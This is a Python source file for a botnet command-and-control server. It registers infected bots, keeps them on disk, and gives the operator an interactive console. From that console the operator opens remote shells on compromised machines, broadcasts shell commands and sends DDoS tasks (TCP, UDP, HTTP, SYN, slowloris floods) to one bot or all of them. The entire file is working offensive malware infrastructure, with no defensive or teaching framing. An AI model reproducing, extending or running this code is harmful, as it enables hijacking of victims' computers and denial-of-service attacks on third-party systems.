"""
c2.py — multi-client C2 with persistence, DDoS tasking, interactive REPL.
"""

import json
import os
import socket
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

from botnet import build_ddos_task, build_stop_task, get_logger


# ═══════════════════════════════════════════════════════
# store
# ═══════════════════════════════════════════════════════

class Store:
    def __init__(self, root="output"):
        self.root = Path(root)
        self.root.mkdir(parents=True, exist_ok=True)
        self.bots_path = self.root / "bots.json"
        self.tasks_dir = self.root / "tasks"
        self.tasks_dir.mkdir(exist_ok=True)
        self.lock = threading.Lock()
        self.bots = self._load_bots()

    def _load_bots(self):
        if not self.bots_path.exists():
            return {}
        try:
            with open(self.bots_path) as f:
                return json.load(f)
        except Exception:
            return {}

    def _save_bots(self):
        tmp = str(self.bots_path) + ".tmp"
        with open(tmp, "w") as f:
            json.dump(self.bots, f, indent=2, default=str)
        os.replace(tmp, self.bots_path)

    def register_bot(self, bot_id, info):
        with self.lock:
            now = datetime.now().isoformat()
            is_reconnect = bot_id in self.bots
            if is_reconnect:
                self.bots[bot_id].update(info)
                self.bots[bot_id]["last_seen"] = now
                self.bots[bot_id]["reconnects"] = self.bots[bot_id].get("reconnects", 0) + 1
            else:
                self.bots[bot_id] = {**info, "first_seen": now,
                                     "last_seen": now, "reconnects": 0}
            self._save_bots()
            return is_reconnect

    def all_bots(self):
        with self.lock:
            return dict(self.bots)

    def get_bot(self, bot_id):
        with self.lock:
            return self.bots.get(bot_id)

    def _task_path(self, bot_id):
        return self.tasks_dir / f"{bot_id}.json"

    def _load_tasks(self, bot_id):
        p = self._task_path(bot_id)
        if not p.exists():
            return []
        try:
            with open(p) as f:
                return json.load(f)
        except Exception:
            return []

    def _save_tasks(self, bot_id, tasks):
        p = self._task_path(bot_id)
        tmp = str(p) + ".tmp"
        with open(tmp, "w") as f:
            json.dump(tasks, f, indent=2, default=str)
        os.replace(tmp, p)

    def queue_task(self, bot_id, task):
        with self.lock:
            tasks = self._load_tasks(bot_id)
            task_id = task.get("id") or f"t{int(time.time() * 1000)}"
            task["id"] = task_id
            task["created_at"] = datetime.now().isoformat()
            task["delivered"] = False
            tasks.append(task)
            self._save_tasks(bot_id, tasks)
            return task_id

    def pending_tasks(self, bot_id):
        with self.lock:
            tasks = self._load_tasks(bot_id)
            pending = [t for t in tasks if not t.get("delivered")]
            for t in tasks:
                if not t.get("delivered"):
                    t["delivered"] = True
                    t["delivered_at"] = datetime.now().isoformat()
            self._save_tasks(bot_id, tasks)
            return pending

    def save_result(self, bot_id, task_id, result):
        with self.lock:
            tasks = self._load_tasks(bot_id)
            for t in tasks:
                if t.get("id") == task_id:
                    t["result"] = result
                    t["finished_at"] = datetime.now().isoformat()
                    break
            self._save_tasks(bot_id, tasks)


# ═══════════════════════════════════════════════════════
# client
# ═══════════════════════════════════════════════════════

class Client:
    def __init__(self, sock, addr, bot_id=""):
        self.bot_id = bot_id
        self.sock = sock
        self.addr = addr
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.alive = True
        self.buffer = b""

    def send(self, data):
        try:
            self.sock.sendall(data)
            return True
        except Exception:
            self.alive = False
            return False

    def sendline(self, line):
        return self.send((line + "\n").encode())

    def recv_some(self, timeout=1.0):
        try:
            self.sock.settimeout(timeout)
            data = self.sock.recv(4096)
            if not data:
                self.alive = False
            else:
                self.last_seen = datetime.now()
            return data
        except socket.timeout:
            return b""
        except Exception:
            self.alive = False
            return b""

    def drain(self):
        out = self.buffer
        self.buffer = b""
        return out

    def close(self):
        self.alive = False
        try:
            self.sock.close()
        except Exception:
            pass

    def label(self):
        up = str(datetime.now() - self.connected_at).split(".")[0]
        ago = int((datetime.now() - self.last_seen).total_seconds())
        return f"[{self.bot_id}] {self.addr[0]}:{self.addr[1]}  up {up}  last {ago}s"


# ═══════════════════════════════════════════════════════
# server
# ═══════════════════════════════════════════════════════

class C2Server:
    def __init__(self, bind="0.0.0.0", port=4444, max_buffer=1_000_000,
                 store_root="output"):
        self.bind = bind
        self.port = port
        self.max_buffer = max_buffer
        self.store = Store(store_root)
        self.clients = {}
        self.lock = threading.Lock()
        self.sock = None
        self.running = False
        self.log = get_logger("c2")

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.bind, self.port))
        self.sock.listen(128)
        self.running = True
        self.log.info(f"listening on {self.bind}:{self.port}")
        self.log.info(f"loaded {len(self.store.all_bots())} bot(s) from disk")
        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self):
        while self.running:
            try:
                sock, addr = self.sock.accept()
            except Exception as e:
                if self.running:
                    self.log.warning(f"accept error: {e}")
                continue

            try:
                sock.settimeout(10)
                bot_id = sock.recv(256).decode(errors="replace").strip()
            except Exception:
                sock.close()
                continue

            if not bot_id:
                sock.close()
                continue

            sock.settimeout(None)
            info = {"ip": addr[0], "port": addr[1]}
            is_reconnect = self.store.register_bot(bot_id, info)

            c = Client(sock, addr, bot_id=bot_id)
            with self.lock:
                self.clients[bot_id] = c

            if is_reconnect:
                bot = self.store.get_bot(bot_id) or {}
                self.log.info(f"[~] reconnect {bot_id} from {addr[0]} "
                              f"(seen {bot.get('reconnects', 0)}x)")
            else:
                self.log.info(f"[+] new bot {bot_id} from {addr[0]}:{addr[1]}")

            threading.Thread(target=self._deliver_pending, args=(c,), daemon=True).start()
            threading.Thread(target=self._reader, args=(c,), daemon=True).start()

    def _deliver_pending(self, c):
        for t in self.store.pending_tasks(c.bot_id):
            c.sendline(json.dumps(t))
            self.log.info(f"[>] delivered queued task {t['id']} to {c.bot_id}")

    def _reader(self, c):
        while c.alive and self.running:
            data = c.recv_some(timeout=2.0)
            if not data:
                time.sleep(0.05)
                continue
            c.buffer += data
            while b"\n" in c.buffer:
                line, c.buffer = c.buffer.split(b"\n", 1)
                try:
                    obj = json.loads(line.decode(errors="replace"))
                    if "task_id" in obj:
                        self.store.save_result(c.bot_id, obj["task_id"], obj)
                        self.log.info(f"[<] result {obj['task_id']} from {c.bot_id}")
                except Exception:
                    pass
            if len(c.buffer) > self.max_buffer:
                c.buffer = c.buffer[-self.max_buffer // 2:]
        self.log.info(f"[-] {c.bot_id} disconnected")

    def queue(self, bot_id, task):
        task_id = self.store.queue_task(bot_id, task)
        with self.lock:
            c = self.clients.get(bot_id)
        if c and c.alive:
            c.sendline(json.dumps(task))
            self.log.info(f"[>] delivered {task_id} to live bot {bot_id}")
        else:
            self.log.info(f"[.] queued {task_id} for offline bot {bot_id}")
        return task_id

    def alive_clients(self):
        with self.lock:
            return [c for c in self.clients.values() if c.alive]

    def get(self, bot_id):
        with self.lock:
            c = self.clients.get(bot_id)
        if c and c.alive:
            return c
        return None

    def known_bots(self):
        return self.store.all_bots()

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        for c in list(self.clients.values()):
            c.close()
        self.log.info("stopped")


# ═══════════════════════════════════════════════════════
# repl
# ═══════════════════════════════════════════════════════

HELP = """
commands:
  list                           live shells
  bots                           all known bots (alive + offline)
  use <bot_id>                   interact with a live shell
  queue <bot_id> <cmd>           queue a shell command
  sendall <command>              broadcast to every live shell
  killall                        close all live shells

  ddos all <ip> <port> [method] [duration] [threads]
  ddos one <bot_id> <ip> <port> [method] [duration] [threads]
  stop all
  stop one <bot_id>

  clear
  help
  exit
"""

SHELL_HELP = """
:back  :list  :flush  :kill
"""


def repl(server):
    print(HELP)
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue

        cmd, _, arg = line.partition(" ")
        cmd = cmd.strip()
        arg = arg.strip()

        if cmd == "list":
            _cmd_list(server)
        elif cmd == "bots":
            _cmd_bots(server)
        elif cmd == "use":
            _cmd_use(server, arg)
        elif cmd == "queue":
            _cmd_queue(server, arg)
        elif cmd == "sendall":
            _cmd_sendall(server, arg)
        elif cmd == "killall":
            _cmd_killall(server)
        elif cmd == "ddos":
            _cmd_ddos(server, arg)
        elif cmd == "stop":
            _cmd_stop(server, arg)
        elif cmd == "clear":
            os.system("clear")
        elif cmd == "help":
            print(HELP)
        elif cmd == "exit":
            break
        else:
            print(f"unknown: {cmd}")

    server.stop()


def _cmd_list(server):
    clients = server.alive_clients()
    if not clients:
        print("(no live shells)")
        return
    print(f"{len(clients)} live shell(s):")
    for c in clients:
        print("  " + c.label())


def _cmd_bots(server):
    bots = server.known_bots()
    if not bots:
        print("(no known bots)")
        return
    print(f"{len(bots)} known bot(s):")
    for bot_id, info in bots.items():
        live = server.get(bot_id) is not None
        mark = "*" if live else " "
        print(f" {mark} {bot_id}")
        print(f"     ip={info.get('ip')}  first={info.get('first_seen')}  "
              f"last={info.get('last_seen')}  reconnects={info.get('reconnects', 0)}")


def _cmd_use(server, arg):
    if not arg:
        print("usage: use <bot_id>")
        return
    c = server.get(arg)
    if not c:
        print(f"no live shell with id {arg}")
        return

    print(f"--- shell {c.bot_id} ({c.addr[0]}) ---")
    print(SHELL_HELP)
    if c.buffer:
        sys.stdout.write(c.drain().decode(errors="replace"))

    while True:
        try:
            line = input(f"{c.bot_id}> ")
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if line == ":back":
            return
        if line == ":list":
            _cmd_list(server)
            continue
        if line == ":kill":
            c.close()
            print(f"[x] closed {c.bot_id}")
            return
        if line == ":flush":
            sys.stdout.write(c.drain().decode(errors="replace"))
            continue
        if not c.sendline(line):
            print("[!] send failed")
            return
        time.sleep(0.7)
        out = c.drain()
        if out:
            sys.stdout.write(out.decode(errors="replace"))
            sys.stdout.flush()


def _cmd_queue(server, arg):
    bot_id, _, command = arg.partition(" ")
    if not bot_id or not command:
        print("usage: queue <bot_id> <command>")
        return
    tid = server.queue(bot_id, {"type": "shell", "args": [command]})
    print(f"queued {tid} for {bot_id}")


def _cmd_sendall(server, arg):
    if not arg:
        print("usage: sendall <command>")
        return
    clients = server.alive_clients()
    for c in clients:
        c.sendline(arg)
    print(f"sent to {len(clients)} shell(s)")


def _cmd_killall(server):
    clients = server.alive_clients()
    for c in clients:
        c.close()
    print(f"closed {len(clients)} shell(s)")


def _parse_ddos(parts):
    if len(parts) < 2:
        return None
    try:
        ip = parts[0]
        port = int(parts[1])
    except (IndexError, ValueError):
        return None
    method = parts[2] if len(parts) >= 3 else None
    duration = int(parts[3]) if len(parts) >= 4 else 60
    threads = int(parts[4]) if len(parts) >= 5 else 200
    return ip, port, method, duration, threads


def _cmd_ddos(server, arg):
    sub, _, rest = arg.partition(" ")
    sub = sub.strip()
    rest = rest.strip()

    if sub == "all":
        parsed = _parse_ddos(rest.split())
        if not parsed:
            print("usage: ddos all <ip> <port> [method] [duration] [threads]")
            return
        target, port, method, duration, threads = parsed
        try:
            task = build_ddos_task(target, port, method, duration, threads)
        except ValueError as e:
            print(f"error: {e}")
            return
        clients = server.alive_clients()
        if not clients:
            print("(no live shells)")
            return
        for c in clients:
            server.queue(c.bot_id, dict(task))
        print(f"ddos -> {len(clients)} bot(s): {target}:{port} "
              f"method={task['method']} duration={duration}s threads={threads}")

    elif sub == "one":
        bot_id, _, rest2 = rest.partition(" ")
        if not bot_id:
            print("usage: ddos one <bot_id> <ip> <port> [method] [duration] [threads]")
            return
        parsed = _parse_ddos(rest2.split())
        if not parsed:
            print("usage: ddos one <bot_id> <ip> <port> [method] [duration] [threads]")
            return
        target, port, method, duration, threads = parsed
        try:
            task = build_ddos_task(target, port, method, duration, threads)
        except ValueError as e:
            print(f"error: {e}")
            return
        server.queue(bot_id, dict(task))
        print(f"ddos -> {bot_id}: {target}:{port} "
              f"method={task['method']} duration={duration}s threads={threads}")

    else:
        print("usage:")
        print("  ddos all <ip> <port> [method] [duration] [threads]")
        print("  ddos one <bot_id> <ip> <port> [method] [duration] [threads]")
        print("methods: tcp udp http https syn slowloris")


def _cmd_stop(server, arg):
    sub, _, rest = arg.partition(" ")
    sub = sub.strip()
    rest = rest.strip()
    task = build_stop_task()

    if sub == "all":
        clients = server.alive_clients()
        if not clients:
            print("(no live shells)")
            return
        for c in clients:
            server.queue(c.bot_id, dict(task))
        print(f"stop -> {len(clients)} bot(s)")
    elif sub == "one":
        if not rest:
            print("usage: stop one <bot_id>")
            return
        server.queue(rest, dict(task))
        print(f"stop -> {rest}")
    else:
        print("usage: stop <all|one <bot_id>>")


# ═══════════════════════════════════════════════════════
# entry
# ═══════════════════════════════════════════════════════

def run_c2(cfg):
    server = C2Server(
        bind=cfg.get("c2", {}).get("bind", "0.0.0.0"),
        port=cfg.get("c2", {}).get("port", 4444),
        store_root=cfg.get("c2", {}).get("store_root", "output"),
    )
    server.start()
    try:
        repl(server)
    except KeyboardInterrupt:
        server.stop()
